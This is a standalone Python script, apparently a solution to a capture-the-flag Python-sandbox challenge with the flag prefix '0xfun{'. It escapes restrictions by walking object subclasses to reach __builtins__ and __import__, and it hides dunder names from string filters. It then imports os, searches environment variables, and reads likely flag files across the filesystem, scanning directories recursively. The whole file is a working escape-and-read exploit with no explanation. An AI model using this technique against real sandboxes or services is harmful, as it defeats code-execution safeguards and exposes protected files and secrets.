d='_'*2
subs=getattr(object,d+'subclasses'+d)()
imp=None
rb=None

for c in subs:
    init=getattr(c,d+'init'+d)
    if hasattr(init,d+'globals'+d):
        g=getattr(init,d+'globals'+d)
        kb=d+'builtins'+d
        if kb in g:
            rb=g[kb]
            ki=d+'import'+d
            if isinstance(rb,dict) and ki in rb:
                imp=rb[ki]
                break
            if not isinstance(rb,dict) and hasattr(rb,ki):
                imp=getattr(rb,ki)
                break

os=imp('os')

if isinstance(rb,dict):
    SE=rb['SystemExit']
else:
    SE=getattr(rb,'SystemExit')

pat=b'0xfun{'

def _print_bytes(b):
    try:
        print(b.decode())
    except Exception:
        print(b)

def _read_file(name,dirfd=None):
    try:
        if dirfd is None:
            fd=os.open(name,os.O_RDONLY)
        else:
            fd=os.open(name,os.O_RDONLY,dir_fd=dirfd)
        try:
            data=os.read(fd,16384)
        finally:
            os.close(fd)
        return data
    except Exception:
        return None

def _check(data):
    if data and pat in data:
        _print_bytes(data)
        raise SE()

try:
    for k in os.environ:
        v=os.environ[k]
        if '0xfun{' in v:
            print(v)
            raise SE()
except Exception:
    pass

root=os.open('/',os.O_RDONLY)

common=(
    'flag',
    'flag.txt',
    'FLAG',
    'FLAG.txt',
    'root/flag',
    'root/flag.txt',
    'home/ctf/flag',
    'home/ctf/flag.txt',
    'home/chal/flag',
    'home/chal/flag.txt',
    'home/challenge/flag',
    'home/challenge/flag.txt',
    'app/flag',
    'app/flag.txt',
    'opt/flag',
    'opt/flag.txt',
    'srv/flag',
    'srv/flag.txt',
    'tmp/flag',
    'tmp/flag.txt',
)
for p in common:
    _check(_read_file(p,root))

def _isdir(name,dirfd):
    try:
        st=os.stat(name,dir_fd=dirfd,follow_symlinks=False)
        return (st.st_mode & 0o170000) == 0o040000
    except Exception:
        return False

def _scan(dirfd,depth):
    try:
        names=os.listdir(dirfd)
    except Exception:
        return
    for n in names:
        ln=n.lower()
        if 'flag' in ln or '0xfun' in ln:
            _check(_read_file(n,dirfd))
        if depth and _isdir(n,dirfd):
            if n in ('proc','sys','dev','run','usr','lib','lib64','bin','sbin','boot'):
                continue
            try:
                sub=os.open(n,os.O_RDONLY,dir_fd=dirfd)
            except Exception:
                continue
            _scan(sub,depth-1)
            try:
                os.close(sub)
            except Exception:
                pass

_scan(root,3)

print('no flag found')
